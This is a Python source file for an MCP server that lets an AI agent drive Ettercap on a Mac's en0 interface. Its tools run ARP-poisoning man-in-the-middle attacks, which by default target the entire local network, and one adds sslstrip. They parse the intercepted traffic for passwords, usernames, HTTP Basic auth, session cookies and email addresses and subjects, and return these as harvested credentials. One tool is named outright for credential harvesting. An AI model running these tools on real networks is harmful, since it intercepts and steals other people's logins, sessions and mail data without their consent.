#Ettercap MCP server (Requires root privilege)

import asyncio
import json
import sys
import re
import time
from datetime import datetime
from mcp.server.fastmcp import FastMCP

# Initialize FastMCP server
mcp = FastMCP("etter-server")

# Hardcoded network interface (Wireless interface in Macbook is en0)
INTERFACE = "en0"

# Full path to ettercap binary
ETTERCAP_PATH = "/opt/local/bin/ettercap"

class TrafficAnalyzer:
    def __init__(self):
        self.packets = []
        self.credentials = []
        self.protocols = {}
        self.sessions = {}
        self.dns_queries = []
        self.http_requests = []
        
    def parse_traffic_line(self, line: str, timestamp: float):
        """Parse Ettercap output for detailed traffic analysis"""
        entry = {
            "timestamp": timestamp,
            "raw_line": line,
            "type": "unknown"
        }
        
        # Parse TCP/UDP sessions with data
        tcp_session = re.search(r'TCP\s+(\d+\.\d+\.\d+\.\d+):(\d+)\s*(?:-->|<--)\s*(\d+\.\d+\.\d+\.\d+):(\d+)', line)
        if tcp_session:
            entry.update({
                "type": "tcp_session",
                "src_ip": tcp_session.group(1),
                "src_port": tcp_session.group(2),
                "dst_ip": tcp_session.group(3),
                "dst_port": tcp_session.group(4),
                "protocol": "TCP"
            })
            self.track_protocol("TCP", entry["src_port"], entry["dst_port"])
        
        # Parse UDP sessions
        udp_session = re.search(r'UDP\s+(\d+\.\d+\.\d+\.\d+):(\d+)\s*(?:-->|<--)\s*(\d+\.\d+\.\d+\.\d+):(\d+)', line)
        if udp_session:
            entry.update({
                "type": "udp_session",
                "src_ip": udp_session.group(1),
                "src_port": udp_session.group(2),
                "dst_ip": udp_session.group(3),
                "dst_port": udp_session.group(4),
                "protocol": "UDP"
            })
            self.track_protocol("UDP", entry["src_port"], entry["dst_port"])
        
        # Parse HTTP requests and responses
        http_request = re.search(r'(GET|POST|PUT|DELETE|HEAD)\s+([^\s]+)\s+HTTP/(\d\.\d)', line)
        if http_request:
            entry.update({
                "type": "http_request",
                "method": http_request.group(1),
                "uri": http_request.group(2),
                "http_version": http_request.group(3)
            })
            self.http_requests.append(entry)
        
        # Parse HTTP response codes
        http_response = re.search(r'HTTP/(\d\.\d)\s+(\d+)\s+([^\r\n]+)', line)
        if http_response:
            entry.update({
                "type": "http_response",
                "http_version": http_response.group(1),
                "status_code": http_response.group(2),
                "status_text": http_response.group(3)
            })
        
        # Parse HTTP headers
        if line.strip().startswith(('Host:', 'User-Agent:', 'Cookie:', 'Authorization:', 'Content-Type:')):
            header_match = re.search(r'([^:]+):\s*(.+)', line)
            if header_match:
                entry.update({
                    "type": "http_header",
                    "header_name": header_match.group(1),
                    "header_value": header_match.group(2)
                })
        
        # Parse credentials (FTP, Telnet, HTTP Basic Auth, etc.)
        credentials_patterns = [
            (r'USER\s+([^\s\r\n]+)', 'username'),
            (r'PASS\s+([^\s\r\n]+)', 'password'),
            (r'LOGIN:\s*([^\s\r\n]+)', 'login'),
            (r'Authorization:\s*Basic\s+([A-Za-z0-9+/=]+)', 'basic_auth'),
            (r'password[:\s=]+([^\s\r\n]+)', 'password_field'),
            (r'username[:\s=]+([^\s\r\n]+)', 'username_field')
        ]
        
        for pattern, cred_type in credentials_patterns:
            match = re.search(pattern, line, re.IGNORECASE)
            if match:
                cred_entry = {
                    "timestamp": timestamp,
                    "type": "credential",
                    "credential_type": cred_type,
                    "value": match.group(1),
                    "source_line": line
                }
                self.credentials.append(cred_entry)
                entry["credential_found"] = True
        
        # Parse DNS queries
        dns_query = re.search(r'DNS.*?(?:query|request).*?([a-zA-Z0-9\.-]+\.[a-zA-Z]{2,})', line, re.IGNORECASE)
        if dns_query:
            domain = dns_query.group(1)
            entry.update({
                "type": "dns_query",
                "domain": domain
            })
            self.dns_queries.append(domain)
        
        # Parse SSH protocol information
        if 'SSH-' in line:
            ssh_version = re.search(r'SSH-([0-9\.-]+)', line)
            if ssh_version:
                entry.update({
                    "type": "ssh_protocol",
                    "ssh_version": ssh_version.group(1)
                })
        
        # Parse SMTP/Email traffic
        smtp_patterns = [
            (r'MAIL FROM:\s*<([^>]+)>', 'smtp_from'),
            (r'RCPT TO:\s*<([^>]+)>', 'smtp_to'),
            (r'Subject:\s*(.+)', 'email_subject')
        ]
        
        for pattern, mail_type in smtp_patterns:
            match = re.search(pattern, line, re.IGNORECASE)
            if match:
                entry.update({
                    "type": mail_type,
                    "email_data": match.group(1)
                })
        
        # Parse payload data (hex/ascii content)
        if re.search(r'[0-9a-fA-F]{2}\s+[0-9a-fA-F]{2}', line):
            entry.update({
                "type": "payload_data",
                "data_format": "hex"
            })
        
        # Track interesting payload content
        payload_keywords = ['password', 'login', 'secret', 'token', 'api', 'key']
        if any(keyword in line.lower() for keyword in payload_keywords):
            entry["contains_sensitive"] = True
        
        return entry
    
    def track_protocol(self, protocol: str, src_port: str, dst_port: str):
        """Track protocol usage statistics"""
        if protocol not in self.protocols:
            self.protocols[protocol] = {"count": 0, "ports": set()}
        
        self.protocols[protocol]["count"] += 1
        self.protocols[protocol]["ports"].add(src_port)
        self.protocols[protocol]["ports"].add(dst_port)
    
    def get_analysis_summary(self):
        """Generate comprehensive traffic analysis summary"""
        return {
            "total_packets": len(self.packets),
            "credentials_found": len(self.credentials),
            "unique_dns_queries": len(set(self.dns_queries)),
            "http_requests": len(self.http_requests),
            "protocols_detected": {k: {"count": v["count"], "ports": list(v["ports"])} 
                                  for k, v in self.protocols.items()},
            "session_count": len(self.sessions)
        }

# Enhanced ARP poisoning with detailed traffic analysis
@mcp.tool()
async def run_ettercap_arp_detailed(target1: str = "///", target2: str = "///", duration: int = 30):
    """
    Run Ettercap ARP poisoning with detailed traffic analysis and protocol dissection.
    Returns intercepted packets, credentials, and protocol information.
    """
    analyzer = TrafficAnalyzer()
    
    # Enhanced command with more verbose output and logging
    cmd = [
        "sudo",
        ETTERCAP_PATH,
        "-T",                    # Text mode
        "-i", INTERFACE,         # Interface
        "-M", "arp:remote",      # ARP poisoning method
        "-P", "autoadd",         # Auto-add new hosts
        "-d",                    # Enable packet dumping
        target1,                 # Target 1
        target2                  # Target 2
    ]
    
    results = []
    
    try:
        process = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        
        start_time = time.time()
        
        async def process_stream(stream, stream_type):
            while time.time() - start_time < duration:
                try:
                    line = await asyncio.wait_for(stream.readline(), timeout=0.5)
                    if line:
                        decoded = line.decode(errors="ignore").strip()
                        if decoded:
                            timestamp = time.time() - start_time
                            
                            # Analyze the traffic line
                            traffic_entry = analyzer.parse_traffic_line(decoded, timestamp)
                            analyzer.packets.append(traffic_entry)
                            
                            # Add to results with enhanced categorization
                            result_entry = {
                                "timestamp": timestamp,
                                "type": stream_type,
                                "line": decoded,
                                "traffic_analysis": traffic_entry
                            }
                            
                            # Mark interesting entries
                            if traffic_entry.get("credential_found"):
                                result_entry["alert"] = "CREDENTIAL_DETECTED"
                            elif traffic_entry.get("contains_sensitive"):
                                result_entry["alert"] = "SENSITIVE_DATA"
                            elif traffic_entry["type"] in ["http_request", "dns_query"]:
                                result_entry["alert"] = "PROTOCOL_DATA"
                            
                            results.append(result_entry)
                            
                except asyncio.TimeoutError:
                    continue
                except Exception as e:
                    results.append({
                        "timestamp": time.time() - start_time,
                        "type": "error",
                        "line": str(e)
                    })
                    break
        
        # Process both stdout and stderr
        await asyncio.gather(
            process_stream(process.stdout, "stdout"),
            process_stream(process.stderr, "stderr")
        )
        
    except Exception as e:
        return {"error": f"Failed to start detailed ARP capture: {str(e)}"}
    finally:
        if 'process' in locals():
            process.terminate()
            await process.wait()
    
    # Generate comprehensive analysis report
    analysis_summary = analyzer.get_analysis_summary()
    
    return {
        "capture_duration": duration,
        "analysis_summary": analysis_summary,
        "intercepted_packets": results,
        "captured_credentials": analyzer.credentials,
        "dns_queries": list(set(analyzer.dns_queries)),
        "http_activity": analyzer.http_requests,
        "protocol_breakdown": analyzer.protocols,
        "alerts": [entry for entry in results if "alert" in entry],
        "sensitive_data_count": len([entry for entry in results if entry.get("traffic_analysis", {}).get("contains_sensitive")])
    }

# Enhanced packet capture with protocol dissection
@mcp.tool()
async def run_ettercap_dissect(duration: int = 20, target_host: str = ""):
    """
    Run Ettercap with protocol dissection enabled to capture detailed packet contents.
    """
    analyzer = TrafficAnalyzer()
    
    # Command for detailed protocol dissection
    cmd = [
        "sudo",
        ETTERCAP_PATH,
        "-T",                    # Text mode
        "-i", INTERFACE,         # Interface
        "-d",                    # Dump packets
        "-v",                    # Verbose
        "-P", "autoadd"          # Auto-add hosts
    ]
    
    # Add target if specified
    if target_host:
        cmd.extend([f"/{target_host}//", "///"])
    
    results = {
        "packet_details": [],
        "protocol_dissection": {},
        "session_data": {},
        "extracted_data": []
    }
    
    try:
        process = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        
        start_time = time.time()
        packet_count = 0
        
        while time.time() - start_time < duration:
            try:
                if process.stdout:
                    line = await asyncio.wait_for(process.stdout.readline(), timeout=0.5)
                    if line:
                        decoded = line.decode(errors="ignore").strip()
                        if decoded:
                            timestamp = time.time() - start_time
                            packet_count += 1
                            
                            # Deep packet analysis
                            packet_analysis = analyzer.parse_traffic_line(decoded, timestamp)
                            
                            packet_detail = {
                                "packet_id": packet_count,
                                "timestamp": timestamp,
                                "raw_data": decoded,
                                "analysis": packet_analysis
                            }
                            
                            results["packet_details"].append(packet_detail)
                            
                            # Extract protocol-specific information
                            if packet_analysis["type"] in ["tcp_session", "udp_session"]:
                                session_key = f"{packet_analysis.get('src_ip', '')}:{packet_analysis.get('src_port', '')}-{packet_analysis.get('dst_ip', '')}:{packet_analysis.get('dst_port', '')}"
                                if session_key not in results["session_data"]:
                                    results["session_data"][session_key] = {
                                        "packets": 0,
                                        "protocol": packet_analysis.get("protocol", "unknown"),
                                        "first_seen": timestamp
                                    }
                                results["session_data"][session_key]["packets"] += 1
                                results["session_data"][session_key]["last_seen"] = timestamp
                            
            except asyncio.TimeoutError:
                continue
            except Exception:
                break
        
    except Exception as e:
        return {"error": f"Protocol dissection failed: {str(e)}"}
    finally:
        if 'process' in locals():
            process.terminate()
            await process.wait()
    
    # Add analysis summary
    results["summary"] = {
        "total_packets": packet_count,
        "capture_duration": duration,
        "protocols_seen": list(analyzer.protocols.keys()),
        "credentials_extracted": len(analyzer.credentials),
        "sessions_tracked": len(results["session_data"])
    }
    
    results["credentials"] = analyzer.credentials
    results["dns_queries"] = analyzer.dns_queries
    
    return results

# Credential harvesting focused capture
@mcp.tool()
async def run_ettercap_harvest_credentials(target1: str = "///", target2: str = "///", duration: int = 60):
    """
    Run Ettercap specifically focused on harvesting credentials and sensitive data.
    """
    analyzer = TrafficAnalyzer()
    
    # Command optimized for credential capture
    cmd = [
        "sudo",
        ETTERCAP_PATH,
        "-T",                    # Text mode
        "-i", INTERFACE,         # Interface
        "-M", "arp:remote",      # ARP poisoning
        "-P", "autoadd",         # Auto-add hosts
        "-P", "sslstrip",        # SSL stripping if available
        target1,
        target2
    ]
    
    credential_results = {
        "captured_credentials": [],
        "login_attempts": [],
        "http_auth": [],
        "email_data": [],
        "sensitive_strings": [],
        "session_cookies": []
    }
    
    try:
        process = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        
        start_time = time.time()
        
        while time.time() - start_time < duration:
            try:
                if process.stdout:
                    line = await asyncio.wait_for(process.stdout.readline(), timeout=0.5)
                    if line:
                        decoded = line.decode(errors="ignore").strip()
                        if decoded:
                            timestamp = time.time() - start_time
                            
                            # Focus on credential extraction
                            traffic_data = analyzer.parse_traffic_line(decoded, timestamp)
                            
                            # Categorize sensitive data
                            if traffic_data.get("credential_found"):
                                credential_results["captured_credentials"].append({
                                    "timestamp": timestamp,
                                    "data": decoded,
                                    "analysis": traffic_data
                                })
                            
                            # Look for login forms and authentication
                            login_indicators = ['login', 'signin', 'auth', 'password', 'username']
                            if any(indicator in decoded.lower() for indicator in login_indicators):
                                credential_results["login_attempts"].append({
                                    "timestamp": timestamp,
                                    "data": decoded
                                })
                            
                            # Extract cookies
                            if 'Cookie:' in decoded or 'Set-Cookie:' in decoded:
                                credential_results["session_cookies"].append({
                                    "timestamp": timestamp,
                                    "cookie_data": decoded
                                })
                            
                            # Look for email content
                            if traffic_data["type"] in ["smtp_from", "smtp_to", "email_subject"]:
                                credential_results["email_data"].append(traffic_data)
                            
            except asyncio.TimeoutError:
                continue
            except Exception:
                break
    
    except Exception as e:
        return {"error": f"Credential harvesting failed: {str(e)}"}
    finally:
        if 'process' in locals():
            process.terminate()
            await process.wait()
    
    # Add summary
    credential_results["summary"] = {
        "capture_duration": duration,
        "total_credentials": len(credential_results["captured_credentials"]),
        "login_attempts": len(credential_results["login_attempts"]),
        "cookies_captured": len(credential_results["session_cookies"]),
        "email_data_points": len(credential_results["email_data"])
    }
    
    # Include the analyzer's findings
    credential_results["all_credentials"] = analyzer.credentials
    credential_results["protocols_used"] = analyzer.protocols
    
    return credential_results

# Batch scan tool
@mcp.tool()
async def run_ettercap_batch(duration: int = 10):
    """
    Run Ettercap and return all captured lines as a JSON array.
    """
    
    cmd = [
        "sudo",
        ETTERCAP_PATH, 
        "-T",           # Text mode
        "-q",           # Quiet mode (less verbose)
        "-i", INTERFACE # Interface
    ]
    
    results = []
    try:
        process = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
    except FileNotFoundError:
        return [{"error": f"Ettercap not found at {ETTERCAP_PATH}. Install via: sudo port install ettercap"}]
    except PermissionError:
        return [{"error": "Permission denied. Ensure server is running with sudo"}]
    except Exception as e:
        return [{"error": f"Failed to start Ettercap: {str(e)}"}]
    
    if not process.stdout or not process.stderr:
        return [{"error": "Failed to open process pipes"}]
    
    try:
        start_time = time.time()
        
        async def read_stream(stream, stream_type):
            lines = []
            while time.time() - start_time < duration:
                try:
                    line = await asyncio.wait_for(stream.readline(), timeout=0.5)
                    if line:
                        decoded = line.decode(errors="ignore").strip()
                        if decoded:
                            entry = {
                                "timestamp": time.time() - start_time,
                                "type": stream_type,
                                "line": decoded
                            }
                            
                            if "->" in decoded or "<-" in decoded:
                                entry["category"] = "traffic"
                            elif "TCP" in decoded or "UDP" in decoded or "ICMP" in decoded:
                                entry["category"] = "protocol"
                            elif decoded.startswith("["):
                                entry["category"] = "info"
                            else:
                                entry["category"] = "other"
                                
                            lines.append(entry)
                except asyncio.TimeoutError:
                    continue
                except Exception as e:
                    lines.append({
                        "timestamp": time.time() - start_time,
                        "type": "error",
                        "line": str(e)
                    })
                    break
            return lines
        
        stdout_task = asyncio.create_task(read_stream(process.stdout, "stdout"))
        stderr_task = asyncio.create_task(read_stream(process.stderr, "stderr"))
        
        stdout_results, stderr_results = await asyncio.gather(stdout_task, stderr_task)
        
        results.extend(stderr_results)
        results.extend(stdout_results)
        results.sort(key=lambda x: x.get("timestamp", 0))
        
    except Exception as e:
        results.append({"error": f"Error during capture: {str(e)}"})
    finally:
        try:
            process.terminate()
            await asyncio.wait_for(process.wait(), timeout=2.0)
        except asyncio.TimeoutError:
            process.kill()
            await process.wait()
        
        results.append({
            "timestamp": duration,
            "type": "info",
            "line": f"Capture finished after {duration} seconds."
        })
        
    return results


# Main function
if __name__ == "__main__":
    print(f"🔍 Enhanced Ettercap MCP Server", file=sys.stderr)
    print(f"📍 Interface: {INTERFACE}", file=sys.stderr)
    print(f"📦 Ettercap: {ETTERCAP_PATH}", file=sys.stderr)
    print(f"⚠️  Must run with sudo for packet capture!", file=sys.stderr)
    print(f"🔍 New tools: run_ettercap_arp_detailed, run_ettercap_dissect, run_ettercap_harvest_credentials", file=sys.stderr)
    print(f"", file=sys.stderr)
    mcp.run(transport="stdio")
